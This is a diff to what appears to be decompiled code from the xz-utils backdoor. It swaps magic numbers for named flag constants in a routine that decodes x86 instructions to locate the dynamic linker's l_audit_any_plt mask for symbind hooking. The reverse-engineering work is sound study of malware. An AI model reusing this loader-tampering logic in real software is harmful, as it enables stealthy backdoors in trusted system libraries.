@@ -77,23 +77,23 @@ BOOL find_l_audit_any_plt_mask_via_symbind_alt
            (telemetry_ok = x86_decode_instruction(&insn_ctx,(u8 *)audit_func_cursor,(u8 *)audit_func_end),
            decoded_insn_size = insn_ctx.instruction_size, telemetry_ok != FALSE))) {
       if ((insn_ctx.opcode_window.opcode_window_dword == X86_OPCODE_2B_MOVZX_RM8) &&
-         ((((ushort)insn_ctx.prefix.flags_u32 & 0x140) == 0x140 &&
+         ((((ushort)insn_ctx.prefix.flags_u32 & (DF16_MEM_DISP | DF16_MODRM)) == (DF16_MEM_DISP | DF16_MODRM) &&
           ((byte)(insn_ctx.prefix.modrm_bytes.modrm_mod - 1) < 2)))) {
         mask_reg_index = 0;
-        if ((insn_ctx.prefix.flags_u32 & 0x40) == 0) {
+        if ((insn_ctx.prefix.flags_u32 & DF16_MODRM) == 0) {
           l_name_reg_index = 0;
-          if ((((insn_ctx.prefix.flags_u32 & 0x1040) != 0) &&
+          if ((((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) &&
               (l_name_reg_index = insn_ctx.prefix.decoded.flags2 & DF2_IMM64,
-              (insn_ctx.prefix.flags_u32 & 0x1000) != 0)) &&
-             (l_name_reg_index = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & 0x20) != 0)) {
+              (insn_ctx.prefix.flags_u32 & DF16_IMM64) != 0)) &&
+             (l_name_reg_index = insn_ctx.mov_imm_reg_index, (insn_ctx.prefix.flags_u32 & DF16_REX) != 0)) {
             l_name_reg_index = insn_ctx.mov_imm_reg_index | ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
           }
         }
         else {
           l_name_reg_index = insn_ctx.prefix.decoded.flags & DF1_REX;
-          if ((insn_ctx.prefix.flags_u32 & 0x20) == 0) {
+          if ((insn_ctx.prefix.flags_u32 & DF16_REX) == 0) {
             mask_reg_index = insn_ctx.prefix.modrm_bytes.modrm_rm;
-            if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
+            if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) {
               l_name_reg_index = insn_ctx.prefix.modrm_bytes.modrm_reg;
             }
           }
@@ -101,13 +101,13 @@ BOOL find_l_audit_any_plt_mask_via_symbind_alt
             mask_reg_index = insn_ctx.prefix.modrm_bytes.modrm_rm |
                      ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
             l_name_reg_index = 0;
-            if ((insn_ctx.prefix.flags_u32 & 0x1040) != 0) {
+            if ((insn_ctx.prefix.flags_u32 & DF16_MODRM_IMM64_MASK) != 0) {
               l_name_reg_index = ((insn_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1) |
                       insn_ctx.prefix.modrm_bytes.modrm_reg;
             }
           }
         }
-        if ((insn_ctx.prefix.flags_u32 & 0x100) != 0) {
+        if ((insn_ctx.prefix.flags_u32 & DF16_MEM_DISP) != 0) {
           lea_operand_disp = (u8 *)insn_ctx.mem_disp;
           if (((uint)insn_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
             lea_operand_disp = insn_ctx.instruction + (long)(insn_ctx.mem_disp + insn_ctx.instruction_size);
